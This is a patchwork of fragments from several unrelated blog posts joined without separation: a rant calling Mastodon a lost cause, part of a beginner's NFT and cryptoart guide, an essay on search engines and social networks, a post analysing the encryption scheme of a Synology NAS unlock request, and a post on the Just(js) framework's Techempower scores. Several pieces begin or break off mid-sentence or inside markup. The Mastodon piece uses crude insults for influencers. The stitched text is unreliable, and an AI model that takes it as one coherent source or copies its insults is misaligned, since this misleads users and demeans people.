<p>So, how about Mastodon then? Looks like Twitter, works like Twitter, but is federated and sadly, also a lost cause.</p>

<h2 id="the-thing-mastodon-gets-wrong">The thing, Mastodon gets wrong</h2>

<p>To me, it seems like Mastodon is trying to be a social network, while, ironically, completely failing to understand the network effect. It’s the right tool for the wrong people (or the wrong tool for the right people? I don’t know).</p>

<p>Let’s face it, what we want is a platform where you can have an intelligent conversation, where our privacy is respected and where we stay in control. But that’s not at all the audience, social media is build for. The ecosystem is entirely structured around all those gone gaga self promoters and would be celebrities that have nothing to contribute except “themselves” and are willing to sacrifice any last piece of dignity, if only it increases their following, so they have a number to show to their sponsors. The deal influencers enter is simple: bring in two new followers to the platform, get (an old) one for free. Keep any of the money, you may make from sponsors. Now go and post pictures of your lunch before (and after) you eat it.</p>

<p>
  
  <span>An ugly truth about building a better mousetrap</span>
  
  
It's the shitty parts, that made the original design so successful.

</p>
                             
                             

<p>And that in a nutshell is why Mastodon is going to fail: it simply is not build for the people who bring in other people, as it lacks any reward mechanism for multipliers. Social media is (and has to be) inherently anti-privacy in order to allow for monetizing “my personal life”. A commodity, available to everyone without any skill requirement to exploit, so there’s no shortage of dipshits, willing to take the deal. Most fail, but even in doing so, still promote the networks.</p>

<h2 id="quo-vadis">Quo vadis</h2>

<p>So, Mastodon has a choice. Either continue on the path of mimicking Twitter (without getting the crucial part right) and stay a niche product. Or (actively) attract marketeers, influencers and other attention whores, by promising them an audience while becoming a federated ad platform.</p>

<p>Either way, it’s not for me.</p>

Don’t be shy! I’m nice.</em></p><h3 id="why-did-i-create-this-guide">Why did I create this guide?</h3><p>I don’t know. It was fun? I’m weird.</p><h2 id="what-is-cryptoart">What is cryptoart?</h2><p>There’s no universally accepted definition of cryptoart. For now, let’s use this:</p><blockquote><p>Cryptoart is art that uses blockchain technology in its creation and/or distribution.</p></blockquote><h2 id="okay-so-what-is-blockchain-technology">Okay, so what is blockchain technology?</h2><p>Think of blockchains as giant spreadsheets<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup> that can be viewed by anyone. I know: <em>Boooring!</em></p><p>But wait! These spreadsheets have ✨special rules✨.</p><ul><li><p>You’re not allowed to delete or change rows in the spreadsheet.</p></li><li><p>You can only add a new row after the last row. (Weird, right?)</p></li><li><p>When you add a row to the spreadsheet, a network of computers do a bunch of super complex math to confirm that what you added is okay. (Even weirder.)</p></li><li><p>If you try to sneak a change into the spreadsheet—like, I don’t know, give yourself a million bucks—that change will be rejected by the network.<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup></p></li></ul><p>Just like normal spreadsheets, blockchains are great for keeping track of transactions.</p><h3 id="um-transactions">Um… transactions?</h3><p>Yeah, you know: I give you something, you give me something in return. Transactions.</p><p>Blockchains store transactions in a way that is viewable by anyone but editable only under certain conditions.</p><p>(See the <a href="#okay-so-what-is-blockchain-technology">special spreadsheet rules above</a>, in case you already forgot them.)</p><h2 id="what-are-nfts">What are NFTs?</h2><p>Now we’re getting to the juicy stuff. 🍋</p><p>NFT stands for Non-Fungible Token. But what does that mean?</p><p><em>Don’t worry about it.</em> Seriously. Other guides try to explain fungibility, but I’m not going to. It’s boring and too technical for our purposes.<sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup></p><p>The keyword to remember is <strong>token.</strong> We’ll come back to it in a minute.</p><p>For now, let’s <strong>think of NFTs as digital collectibles.</strong> In the real world, pretty much anything can be collectible, given the right conditions: stamps, books, Pokémon cards, spoons.</p><p>(No really, <a href="https://www.ebay.com/b/Souvenir-Spoons/bn_7006309973" target="_blank">people collect spoons</a>.)</p><p>The same is true in the digital world. <strong>NFTs are a <a href="#okay-so-what-is-blockchain-technology">blockchain technology</a></strong> that allow people to collect and trade just about anything, including… wait for it… <em>art.</em></p><p><img src="https://justincone.com/images/mona.jpg" alt="Modern Mona Lisa"><em>This terrible thing, which I created in five minutes, could totally be an NFT.</em></p><p>Theoretically, NFTs can be used for lots of other stuff, too: issuing movie tickets, selling video game items, or even proving ownership of real estate.</p><p>But let’s stay focused: we’re talking about digital art here.</p><h2 id="what-is-digital-art">What is “digital art”?</h2><p>Oh no, we’re not going down <em>that</em> rabbit hole.</p><p>You’ll have to define digital art for yourself. Whatever definition you have in your head is probably good enough for our purposes.</p><p>Let’s keep moving.</p><p>There are two basic steps to creating an NFT:</p><ol><li>Make a thing.</li><li>Tokenize the thing.</li></ol><h2 id="1-make-a-thing">1. Make a thing</h2><p>NFTs start as digital art (i.e. stuff you already know how to make):</p><ul><li>still images</li><li>GIFs</li><li>video loops (with or without audio)</li><li>music</li></ul><h3 id="what-about-physical-art-cant-i-turn-a-sculpture-or-a-painting-into-an-nft">“What about physical art? Can’t I turn a sculpture or a painting into an NFT?”</h3><p>Kind of. It’s trickier than you think. We’ll get to it in a second.</p><p>(If you really can’t wait, <a href="#creating-physical-objects">jump ahead</a>. But don’t get mad at me if you’re confused.)</p><h2 id="2-tokenize-the-thing">2. Tokenize the thing</h2><p>Remember <a href="#what-are-nfts">earlier</a> that we said NFTs are tokens? Follow along:</p><ul><li><p>For our purposes, think of a token as a digital link to something you’ve made.</p></li><li><p>Tokens live on blockchains, which we’ve <a href="#okay-so-what-is-blockchain-technology">already established</a> are great for keeping track of transactions.</p></li><li><p>When you “tokenize” a digital artwork, you’re linking something you’ve made to a blockchain, which can be useful for proving ownership of that thing (among other things).</p></li></ul><h3 id="wait-there-are-_multiple_-blockchains">“Wait, there are <em>multiple</em> blockchains?”</h3><p>Oh yeah, there are loads of blockchains. You can even <a href="https://dzone.com/articles/how-to-create-your-own-cryptocurrency-blockchain-i" target="_blank">create your own</a>.</p><p>For NFTs, Ethereum is currently the most popular blockchain.<sup id="fnref:4"><a href="#fn:4" role="doc-noteref">4</a></sup></p><p>This is important: <strong>the token by itself is not cryptoart.</strong></p><p>The NFT (remember: T is for token) merely <em>points</em> to something else and says, “Hey, this thing and I are joined at the hip. We’re inseparable. Think of us as <strong>one</strong>.”</p><p><img src="https://justincone.com/images/nft-diagram.jpg" alt="Diagram showing the relationship between an NFT and a hosted digital image."><em>Token + media = cryptoart</em></p><h3 id="how-do-you-link-a-token-to-a-digital-thing">How do you link a token to a digital thing?</h3><p>Typically, you link a token to a digital thing you’ve made by attaching some extra information (metadata) to the NFT. That extra info includes a link to an image, video, GIF, song, etc. that’s hosted somewhere else.<sup id="fnref:5"><a href="#fn:5" role="doc-noteref">5</a></sup></p><p>This arrangement begs a few questions:</p><ul><li>Where will the “official” digital asset be hosted?</li><li>How can collectors ensure that the asset won’t be changed by the artist?</li><li>What happens if the asset host goes down? Or disappears?</li></ul><p>There are solutions to these problems in the works,<sup id="fnref:6"><a href="#fn:6" role="doc-noteref">6</a></sup> and some of them get technical pretty fast<sup id="fnref:7"><a href="#fn:7" role="doc-noteref">7</a></sup>. This topic goes beyond the introductory level, so let’s keep moving for now.</p><h2 id="understanding-ownership">Understanding “ownership”</h2><h4 id="if-the-nft-isnt-the-actual-image-animation-music-etc-that-i-created-cant-people-just-copy-my-artwork">“If the NFT isn’t the actual image, animation, music, etc. that I created, can’t people just copy my artwork?”</h4><p>Remember: <strong>The complete cryptoart is the token <em>and</em> the media you created.</strong> So they can copy your image or your GIF or whatever… but it doesn’t really matter.</p><p>Depending on how you see things, this is either great news or a big problem.</p><p><em>(By the way, the inherently copiable nature of digital art is the #1 thing I see NFT newbies struggling with—and for good reason. It’s confusing.)</em></p><h3 id="okay-lets-work-through-this-together">Okay, let’s work through this together.</h3><p>An NFT says that one specific copy of your digital media—the one listed in the NFT’s metadata—is the one that matters.</p><p><em>We discussed this above. If you missed it, <a href="#token--media--cryptoart">go back</a> and make sure you understand it before moving on.</em></p><p>So you could have literally millions of copies of your sweet CG teapot floating around the web, but the owner of your cryptoart only cares about the “official” copy linked to the NFT.</p><h4 id="im-sorry-but-thats-insane">“I’m sorry, but that’s insane.”</h4><p>At first blush, <em>I agree.</em> But let’s step back for a second.</p><p>For a few bucks, you can find and print a high-resolution copy of Cindy Sherman’s “Untitled #96.” Here’s a copy of it <em>right here:</em></p><p><img src="https://justincone.com/images/sherman.jpeg" alt="Cindy Sherman's 'Untitled #96'"><em>“Untitled #96” by Cindy Sherman (1981)</em></p><p>In 2011, a print of that photograph <a href="https://en.wikipedia.org/wiki/Untitled_96" target="_blank">sold for $3.89 million USD during a Christie's auction</a>—setting a record for the most expensive photo ever sold (at that time).&nbsp;</p><p>Then, as now, people could easily reproduce the photo. Somehow, though, this didn’t stop the photo from selling for a boatload of cash.</p><h4 id="thats-different-people-were-buying-one-specific-print-of-the-photograph-one-created-by-the-artist-and-it-was-a-print-of-the-highest-quality">“That’s different. People were buying one specific print of the photograph, one created by the artist. And it was a print of the highest quality.”</h4><p>What if we broke into Cindy Sherman’s private studio, stole the original negative of the photograph, and then produced a print that was identical in quality to the one sold during the 2011 auction?</p><p>Would we be able to sell it for the same amount? Or more?</p><h4 id="no">“No.”</h4><p>Why not?</p><h4 id="it-wouldnt-be-official-it-wouldnt-be-from-the-artist">“It wouldn’t be official. It wouldn’t be from the artist.”</h4><p>Ah! Interesting. So we need to be able to trace the print back to the artist somehow?</p><h4 id="okay-i-see-where-youre-going-an-nft-traces-the-official-artwork-back-to-the-artist-and-the-blockchain-can-show-all-the-subsequent-owners-including-the-current-one">“Okay, I see where you’re going. An NFT traces the official artwork back to the artist, and the blockchain can show all the subsequent owners, including the current one.”</h4><p>Exactly.</p><h4 id="but-what-if-we-hung-our-copy-right-next-to-the-official-print-in-an-identical-frame">“But what if we hung our copy right next to the official print in an identical frame?”</h4><p>It wouldn’t matter.</p><h4 id="what-yes-it-would-you-wouldnt-be-able-to-tell-them-apart">“What?! Yes, it would! You wouldn’t be able to tell them apart.”</h4><p>The owner would know that the official version is the one in that <em>exact</em> spot on the wall, in that specific building.</p><p>It’s the same with NFTs: They point to a specific copy of a digital artwork “hanging” in a specific place on the internet.</p><h4 id="i-still-think-its-crazy-that-people-can-copy-my-images-that-devalues-the-art">“I still think it’s crazy that people can copy my images. That devalues the art!”</h4><p>Maybe. But it doesn’t <em>always</em> work that way.</p><p>I bet your mother or your uncle has a magnet on their refrigerator of one of Monet’s famous Water Lilies paintings.</p><p>Amazon currently returns nearly 800 items when you search for “Monet Water Lilies,” including neckties, mouse pads, and face masks.</p><p><img src="https://justincone.com/images/mask.jpeg" alt="Monet face mask"><em>A horrendous idea for a face mask.

        <p>The way the internet has evolved, at least how people search for information, is search engines.&nbsp; Most phones, which is what the majority of the world uses to browse the internet, like computers did back in the day, come preinstalled with browsers and search engines.&nbsp; Some even come installed with social networks.</p><p>Now this is in part by design and in part by the fact that it was the simplest solution at the time because it was the best.&nbsp; Take for example when google came out.&nbsp; All the other search engines, looked spamish, and generally their results where not too great.</p><p>Along comes google, giving you a new authority engine.&nbsp; Then out of no where there is a nice simple way to search for things on the internet instead of having to type in a domain and hope some one developed it.</p><p>This was awesome, and still probably is.&nbsp; But as more and more people started using the internet, also came the copious amount of volume that humans produce also needing to be indexed and ranked via authority. </p><p>This is generally helpful as most people trust the top search results now a days of most search engines.&nbsp; So how does this lead for social networks dominance.&nbsp; Well, let's assume that some one doesn't have FaceBook or similar.&nbsp; They get brand new access to a phone or something, and do a simple search.&nbsp; </p><p>Now FaceBook, Amazon, Harvard, all have authority.&nbsp; They are "trusted" sourced of content on the internet.&nbsp; There are of course others, but I'm trying to keep things simple. The only difference is Harvard does not have the entire world population able to post on it.<br></p><p>So by default if someone, qualified, or not, was to write something on FaceBook about a subject.&nbsp; Just by the amount of clout that FB has due to the number of other sites linking to it in the world, and the speed at which the site loads, on top of the fact that the parts that are exposed are also designed to be optimized for a search engine means that any new potential visitor is most likely going to land on that site.</p><p>So by therefor all new internet users end up visiting some of the major authorities on the internet that basically made it easier for humans to be able to post and publish things, ie becoming an indeterminate.&nbsp; </p><p>And since humans are far more creative in collective than any one human can be, by being the source of where people can publish things for sale, or thoughts, it by algorithmic process leads to the situation we are in.&nbsp; Of course there are ways to get around this, but that's not for today.<br></p>

February 19, 2021 | https://capnfabs.net/posts/wtf-encryption-scheme-synology-diskstation-nas/ | <a href="https://web.archive.org/web/*/https://capnfabs.net/posts/wtf-encryption-scheme-synology-diskstation-nas/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody" id="content"><p>I have taken a couple terabytes of photos over the years, and have a mild phobia of deleting data, so I keep my photos on a <a href="https://www.synology.com/en-global">Synology DiskStation NAS</a>. I’ve got all the files on the thing:</p><ul><li>backed up to the cloud</li><li>encrypted,</li></ul><p>because back in 2016, my <a href="https://www.instagram.com/p/BMpgY9zAGbD/">apartment was broken into and thieves took all the electronics</a>. I’ve been slightly paranoid ever since.</p><p>The Synology NAS generally works pretty well, but the interface for decrypting a drive after booting is <em>extremely</em> painful. It’s about 10 clicks, a username, two different passwords, and a UI that is kinda wonky (it’s a desktop in a web browser)? Here’s a screengrab:</p><figure><video alt="Unlocking an encrypted drive in the Synology DiskStation UI" src="https://capnfabs.net/posts/wtf-encryption-scheme-synology-diskstation-nas/decrypt.mp4" width="588" muted="" autoplay="" loop="" playsinline=""></video><figcaption><p>22 seconds is my personal speed record.</p></figcaption></figure><p>There are alternative solutions to this – you can set it up so that it <a href="https://www.synology.com/en-au/knowledgebase/DSM/tutorial/File_Sharing/How_to_encrypt_and_decrypt_shared_folders_on_my_Synology_NAS#t4_1">reads the encryption key from a USB disk on startup, for example</a> – but, if I’m worried about the whole thing being stolen, it’s not a good idea to leave the encryption keys plugged into the thing, and it’s also not a nice UX to find and plug in a USB before turning the thing on.</p><p>This… seems kinda silly to me, and something that should be solvable with ✨ <em>technology</em> ✨. I’m only ever accessing this from one computer, for example, and every modern operating system has a good credential storage system (think <a href="https://support.apple.com/guide/keychain-access/what-is-keychain-access-kyca1083/mac"><em>Keychain Access</em></a> on OSX or <a href="https://support.microsoft.com/en-us/windows/accessing-credential-manager-1b5c916a-6a16-889f-8581-fc16e8165ac0"><em>Credential Manager</em></a> on Windows 10). So, maybe my computer could take care of supplying encryption keys to the DiskStation!</p><p>I went looking for options, and discovered that the DiskStation Software has a <a href="https://global.download.synology.com/download/Document/Software/DeveloperGuide/Package/FileStation/All/enu/Synology_File_Station_API_Guide.pdf">publicly-documented web API (pdf)</a>. At least, a <em>mostly</em> publicly documented web API – there’s no documentation for the methods to mount and unmount encrypted shares.</p><p>That web API is <em>also</em> used by the desktop software though! So it should theoretically be possible to use <a href="https://developer.mozilla.org/en-US/docs/Learn/Common_questions/What_are_browser_developer_tools">browser devtools</a> to see exactly <em>what</em> is being sent to the DiskStation. 🤔</p><p>So, I clicked on all the right things in the Web UI, got to the bit where you type in the password, opened the devtools to the “Network Requests” tab, typed in <code>abc123</code> as my password, hit “send” and then watched for the requests:</p><figure><img src="https://capnfabs.net/posts/wtf-encryption-scheme-synology-diskstation-nas/encryption-dot-cgi.png" alt="Firefox devtools screenshot, showing a request to an ominously-named 'encryption.cgi'"><figcaption><p>hmmmmmmmmmmm</p></figcaption></figure><p>Hmmm, that <code>encryption.cgi</code> looks a little ominous. I wonder what’s in it?</p><figure><img src="https://capnfabs.net/posts/wtf-encryption-scheme-synology-diskstation-nas/public-key.png" alt="Firefox devtools screenshot, showing huge blob of base16-encoded public-key"><figcaption><p>Yep, looks like encryption, alright</p></figcaption></figure><p>Ok, a public key. And then the web interface loads a spinner, and makes a request to <code>entry.cgi</code>. Let’s take a look at the contents of that request:</p><figure><img src="https://capnfabs.net/posts/wtf-encryption-scheme-synology-diskstation-nas/ciphertext.png" alt="A devtools screenshot, showing a jumbled blob of base64-encoded data with the phrases 'rsa' and 'aes' sprinkled throughout."><figcaption><p>HMMMMMMMMMMMMMMMM</p></figcaption></figure><p>Ok, so if we want to send a magic request to mount the encrypted share, it’s not going to be enough to supply the encryption password; we’re also going to need to figure out how to <em>correctly</em> supply it – how to <em>encrypt</em> the encryption password, so to speak.</p><h2 id="so-what-is-this-crypto-system">So, what is this crypto system?</h2><p>Right. Here’s a high-level overview:</p><ul><li>First, we fetch the <code>public_key</code> from the server. That’s the call to the <code>encryption.cgi</code> endpoint we saw earlier. This isn’t actually the entire public key, it’s only <em>part</em> of it. In fact, this is a 4096-bit integer, encoded in base-16. The <em>other</em> part of the public key is the number <code>0x10001 == 65537</code>, which is hardcoded into the JavaScript.</li><li>Then, we generate 501 bytes worth of random text from the charset <code>0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~!@#$%^&amp;*()_+-/</code> (that’s 77 different possible characters; I have no idea why this set was chosen though!).</li><li>We encrypt that random text using our public key. The encryption method is <a href="https://tools.ietf.org/html/rfc3447#section-7.2">RSA with PKCS1.5 padding</a>.</li><li>We MD5-hash that random text a bunch of times with an 8-byte salt. The end result of this is 48 bytes which certainly <em>look</em> pretty random to the naked eye.</li><li>We split those 48 bytes into two components – a 32-byte (== 256-bit) key, and a 16-byte initialisation vector.</li><li>Remember the password we typed in? Yeah, I’d forgotten about it too! But now, we <em>finally</em> take that password, and encrypt it with AES in Cipher Block Chaining (CBC) mode with PKCSv7 padding, using the 256-bit key and 16-byte IV we derived in the previous step.</li><li>We bundle the RSA ciphertext, the 8-byte salt, and the AES ciphertext together and ship them across to the DiskStation.</li></ul><p>Still with me? It’s ok if that didn’t all make loads of sense yet; we’ll now go over the interesting bits more closely.</p><h3 id="symmetric--asymmetric-ciphers">Symmetric / Asymmetric Ciphers</h3><p>Fundamentally, we’re using two cryptographic algorithms in concert:</p><ul><li><strong>RSA</strong>: RSA is an <em>asymmetric</em> cryptographic algorithm. Asymmetric cryptographic systems have two <em>keys</em> – a public key, which allows only for encryption of the data, and a private key, which allows for both encryption <em>and</em> decryption.</li><li><strong>AES</strong>: AES is a <em>symmetric</em> cryptographic algorithm. In symmetric cryptography, all parties have the same key, and that key allows you to both encrypt and decrypt.</li></ul><p>It seems weird that we’re using both of these at the same time, right? But both systems have weaknesses, and mixing them together is an attempt at minimising the disadvantages of both schemes.</p><p>The problem with <em>symmetric</em> crypto systems by themselves is that you need a way to get that one key to every party that needs it. But you can’t just <em>send</em> it to them, because you don’t have a secure channel yet! Your options are:</p><ul><li>Share the key over a different trusted channel beforehand, or</li><li>have both parties derive the same shared key (from e.g. some partial data that they negotiate over the wire beforehand).</li></ul><p>Asymmetric crypto doesn’t have this problem – if you’re able to share a key that can only be used for encrypting and not for decrypting, then the decryption keys never have to leave the recipient machine. You can then encrypt some text, and nobody except for the recipient can decrypt it – not even you! Put it on the internet, write it on a banner attached to the back of a propeller plane – the message will only be readable by the intended recipient.</p><figure><img src="https://capnfabs.net/posts/wtf-encryption-scheme-synology-diskstation-nas/your-ciphertext-here.jpg" alt="A propeller plane with a banner reading 'your ciphertext here'"></figure><p>Asymmetric cryptography is <em>slow</em>, though, so doing it for lots of data is going to really hurt performance.</p><p>A common solution is to simply <em>make up</em> a symmetric key, perform some symmetric encryption using that key, then encrypt <em>that</em> key using asymmetric cryptography, and deliver both to the remote party. Then, the remote party can:</p><ul><li>First, perform asymmetric decryption to obtain the symmetric key</li><li>Then, use that symmetric key to decrypt the rest.</li></ul><p>That’s what <em>this</em> particular system is doing. ✨</p><h3 id="a-quick-note-about-rsa">A quick note about RSA</h3><p>I don’t know much about how RSA works, but as part of researching this article I discovered that it’s pretty easy to implement badly, and <a href="https://blog.trailofbits.com/2019/07/08/fuck-rsa/">extremely difficult to implement well</a>.</p><figure><img src="https://capnfabs.net/posts/wtf-encryption-scheme-synology-diskstation-nas/rsa-correct.gif" alt="Two developers correctly implement RSA, 2010, colorised"><figcaption><p><a href="https://www.youtube.com/watch?v=vPwzHm6buB8">Two developers correctly implement RSA</a>, 2010, colorised</p></figcaption></figure><p>As software developers, we spend a lot of time shipping things once they get to a point of “it looks like it works”. <strong>You can’t take that approach with cryptography</strong>, and because everything is so opaque, it’s a lot easier to declare that your implementation works without realising that it’s missing fundamentals. Like correctness, for example.</p><h3 id="lets-talk-about-random-keyslets-talk-about-you-and-me">Let’s talk about random keys<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup></h3><p>Recall that this algorithm is generating 501 random bytes from a 77-character set, and encrypting that with RSA. 501 seemed like an oddly specific number to me; here’s the specific set of circumstances that characterise <em>why</em> we’re generating a string of this length.</p><p>RSA is a <a href="https://en.wikipedia.org/wiki/Block_cipher"><em>block cipher</em></a>, which means it operates on distinct fixed-size blocks of input and produces fixed-size blocks of output. How big can each block be? Well, RSA public keys are made up of two numbers: a (very large) modulus <code>n</code>, and a much smaller exponent <code>e</code>. RSA is capable of encrypting any message that’s smaller than <code>n</code> if you convert it to a number. In our case, we said that our modulus was a seemingly-random 4096-bit integer – that means (approximately) that we can encrypt 512-byte blocks.</p><p>There’s an important implication here: if you don’t have enough input for a block, you need to fill it up somehow. Normally this is called a <em>padding scheme</em><sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup> in block-based cryptography.</p><p>Now, the system on this NAS in particular uses <a href="https://tools.ietf.org/html/rfc3447#section-7.2.1">PKCS1-v1.5 padding</a>, which prepends the message (before encryption) with 3 bytes of headers <em>plus</em> a minimum of 8 bytes<sup id="fnref:4"><a href="#fn:4" role="doc-noteref">4</a></sup> of random garbage. That makes 11 bytes out of a 512 byte block, which means we’ve got… 501 bytes left for our message. ✨</p><h3 id="lo-fi-key-derivation">Lo-fi key derivation</h3><p>So… we’ve got this 501-byte string, with each character being one of 77 possibilities, and we think we know <em>why</em> it was chosen to be 501 bytes long. But that’s not going to work for AES-encrypting the password:</p><ul><li>AES requires a key size of 128, 192, or 256 bits. That’s 16, 24, or 32 bytes respectively, but we’ve got <em>lots</em> more than that.</li><li>We can’t, however, just take a subset of bytes from the text and go from there – because they’re selected from a narrow subset of possible bytes (77 out of 255!), you’d be losing an <em>enormous</em> amount of entropy in the key, making the encrypted text about 44,000,000,000,000,000 times<sup id="fnref:5"><a href="#fn:5" role="doc-noteref">5</a></sup> easier to break.</li></ul><p>These constraints need to be managed. We can smooth over both by applying a <a href="https://en.wikipedia.org/wiki/Key_derivation_function">key derivation function</a>, based on repeated rounds of MD5 hashing and concatenating. Hash algorithms, in general, are good for this because they map input data to… not random, but random-<em>looking</em> output data.</p><p>I like to think of hashing as “entropy laundering” – if you’ve got 256 bits of entropy in a 16kB file, taking the first 256 bits will give you only 64 bits of entropy. If you hash the whole 16kB file, then the entropy goes back up to the maximum of the entropy in the file and the entropy provided by the hash algorithm. This works because hash algorithms are designed to exhibit an <a href="https://en.wikipedia.org/wiki/Avalanche_effect">avalanche effect</a>.</p><p>I do <em>not</em> have the tools or experience to evaluate whether this specific scheme is secure or not (this one seems esoteric, and the <a href="https://security.stackexchange.com/questions/19906/is-md5-considered-insecure">use of MD5 is scary</a>!)… so let’s move briskly on.</p><h3 id="aes-encryption">AES-encryption</h3><p>Finally, after a bunch of outdated and somewhat esoteric primitives, we’re back to something that is <em>good</em> and <em>works</em> and <em>only slightly</em> a <a href="https://en.wiktionary.org/wiki/footgun">loaded footgun</a> and is <em>still recommended for widespread use!</em> It’s AES with a 256-bit key.</p><p>AES is our symmetric cipher. Like RSA, it operates on blocks of fixed length. <a href="https://crypto.stackexchange.com/questions/66314/whats-the-best-block-cipher-mode-of-operation-for-rsa/66321#66321">Unlike RSA</a>, these blocks can be chained together. The strategies to do this are called <a href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation">“Block cipher modes of operation”</a>, and AES implementations ship with a number of them. The problem is, this means you have access …</p></div></div>

<h2>Why is Javascript in the top 2 of techempower?</h2>
<p>This question was recently <a target="_blank" rel="noopener" href="https://github.com/justjs/just/issues/5">asked</a> on github, prompted by the <a target="_blank" rel="noopener" href="https://www.techempower.com/benchmarks/#section=test&amp;runid=4389df09-c5d3-47fb-80a3-6ea787a9a895&amp;hw=ph&amp;test=composite&amp;a=2">arrival</a> of a new javascript platform near the summit of the intermediate <a target="_blank" rel="noopener" href="https://www.techempower.com/benchmarks/#section=intro">techempower</a> rankings. This platform, Just(js), is something I have been hacking on as a side-project for some time now. Here I will attempt to give a brief answer to the question and will be following up with some further detail on this and the platform itself over the coming weeks.</p>
<p>If you find yourself getting hot under the collar reading this, please check the <a href="#caveats">caveats</a> below before going any further.</p>
<h2>What are the Techempower Rankings?</h2>
<p>The techempower rankings have been running since 2013 and have become a very useful tool for a number of reasons.</p>
<ul>
<li>It's a great place to get a good overview of the various frameworks available in different languages and on different platforms.</li>
<li>It covers a pretty good range of basic tasks any web service is going to need to perform. There are definitely some big gaps but the folks at techempower have plans to develop it further.</li>
<li>It gives some useful insight into where the relative strengths and weaknesses of various platforms and languages lie.</li>
<li>It is having an effect in highlighting weaknesses and driving efforts in many of these frameworks to improve performance. It shows consistent improvement in the average performance of the competing frameworks. While all such competitions should be taken with a large grain of salt, they do have an effect in <a target="_blank" rel="noopener" href="https://benediktmeurer.de/2016/12/16/the-truth-about-traditional-javascript-benchmarks/">driving efficiences</a>. The combined score of the top 5 frameworks has improved by 62% from 24k in <a target="_blank" rel="noopener" href="https://www.techempower.com/benchmarks/#section=data-r16">round 16</a> to 39k in <a target="_blank" rel="noopener" href="https://www.techempower.com/benchmarks/#section=data-r19">round 19</a> and it currently stands at 48k in the <a target="_blank" rel="noopener" href="https://www.techempower.com/benchmarks/#section=test&amp;runid=4389df09-c5d3-47fb-80a3-6ea787a9a895&amp;hw=ph&amp;test=composite&amp;a=2">latest</a> intermediate round.</li>
</ul>
<h2>What is Just(js)?</h2>
<p><a target="_blank" rel="noopener" href="https://github.com/just-js">Just(js)</a> is a small, simple and hopefully efficient javascript server side framework built on top of the <a target="_blank" rel="noopener" href="https://v8.dev/">google v8</a> javascript engine. Currently it supports modern linux on x86_64 only. It is still quite a way from a stable beta but I am not expecting any big changes to functionality and the code base is very small (approx 5k lines of c++ and javascript) so it should not be a huge amount of work to bring it to some kind of stable state.</p>
<p>I will go into more detail in future posts on the rationale and motivations behind it but for now I can say the main goals are to:</p>
<ul>
<li>have a small codebase and as few source files as possible (i.e. reduce the cognitive load)</li>
<li>favour c-style function calls over complex OO structures</li>
<li>be efficient in execution and memory usage</li>
<li>be single platform only, which means the code is easier to understand without lots of macros and #ifdefs everywhere</li>
<li>be easy to understand and hack on for anyone with some basic knowledge of c/c++ and linux system api's</li>
<li>be a useful platform for learning more about the v8 engine and linux system apis</li>
<li>be easy to extend and customise for embedders</li>
<li>demonstrate that javascript can be a valid choice for building high performance system level software and network servers</li>
</ul>
<h2>Just Show Me The Results Already!</h2>
<p>Okay, Okay! Here are the top 10 frameworks from the latest techempower intermediate run. Please read the <a href="#caveats">caveats</a> to understand why these results should be taken with a little skepticism for now.</p>
<p><a href="https://just.billywhizz.io/blog/on-javascript-performance-01/header.png"><img width="605" height="340" src="https://just.billywhizz.io/blog/on-javascript-performance-01/header.png" alt="Intermediate Results Top 10"></a></p>
<p>
Intermediate Results Top 10
</p>
<p>You can see the full results <a target="_blank" rel="noopener" href="https://www.techempower.com/benchmarks/#section=test&amp;runid=4389df09-c5d3-47fb-80a3-6ea787a9a895&amp;hw=ph&amp;test=composite&amp;a=2">here</a>.</p>
<p>There are a few things we can note:</p>
<ul>
<li>The top rankings are dominated by C++ and Rust frameworks, which is to be expected.</li>
<li>Just(js) squeezes in just behind the top performing <a target="_blank" rel="noopener" href="https://github.com/matt-42/lithium">C++ framework</a> achieving 95% of its composite score and 4% ahead of the <a target="_blank" rel="noopener" href="https://github.com/an-tao/drogon">next best</a> performing C++ framework.</li>
<li>Just(js) scores 10% and 13% better than the top performing <a target="_blank" rel="noopener" href="https://github.com/ntex-rs/ntex">Rust</a> <a target="_blank" rel="noopener" href="https://github.com/actix/actix">frameworks</a></li>
<li>In comparison to other "high level" languages, Just(js) scores 32% higher than the best performing <a target="_blank" rel="noopener" href="https://github.com/aspnet">C#/.Net</a> and <a target="_blank" rel="noopener" href="https://jooby.io/">Java</a> frameworks.</li>
<li>Just(js) scores 40% higher than the best performing <a target="_blank" rel="noopener" href="https://github.com/gofiber/fiber">Go framework</a>.</li>
</ul>
<p>When comparing to other Javascript frameworks the difference becomes quite stark.</p>
<p><a href="https://just.billywhizz.io/blog/on-javascript-performance-01/js-frameworks.png"><img width="1132" height="218" src="https://just.billywhizz.io/blog/on-javascript-performance-01/js-frameworks.png" alt="Intermediate Results Javascript Frameworks"></a></p>
<p>
Results for Javascript Frameworks
</p>
<ul>
<li>Just(js) scores 2x higher than the next best performing Javascript framework, <a target="_blank" rel="noopener" href="https://github.com/reactiverse/es4x">es4x</a> which is based on Vert.x and the JVM.</li>
<li>It scores 5x-6x higher than the <a target="_blank" rel="noopener" href="https://github.com/lukeed/polkadot">best</a> Node.js based Javascript <a target="_blank" rel="noopener" href="https://www.fastify.io/">frameworks</a>.</li>
</ul>
<h2>How Does Just(js) Achieve These Scores?</h2>
<p>Well, it was <em>a lot</em> of hard work. My initial attempts, which I benchmarked on my laptop against the best C++, Rust and Javascript frameworks were so-so.</p>
<p><a href="https://just.billywhizz.io/blog/on-javascript-performance-01/initial.png"><img width="562" height="331" src="https://just.billywhizz.io/blog/on-javascript-performance-01/initial.png" alt="Initial Tests"></a></p>
<p>
Results of Inital Local Tests
</p>
<p>I was only seeing 50% of the best performers, with particularly bad scores for the multi-query, update and fortunes tests, which are the most relevant ones to real-world scenarios.</p>
<p><a href="https://just.billywhizz.io/blog/on-javascript-performance-01/initial-detail.png"><img width="944" height="123" src="https://just.billywhizz.io/blog/on-javascript-performance-01/initial-detail.png" alt="Initial Tests Detail"></a></p>
<p>
Detail of Initial Local Tests
</p>
<p>I wasn't too disappointed by that and still had plenty of room for optimizations and a strong instinct that big improvements could be made, so I set to work.</p>
<h3>Postgres API</h3>
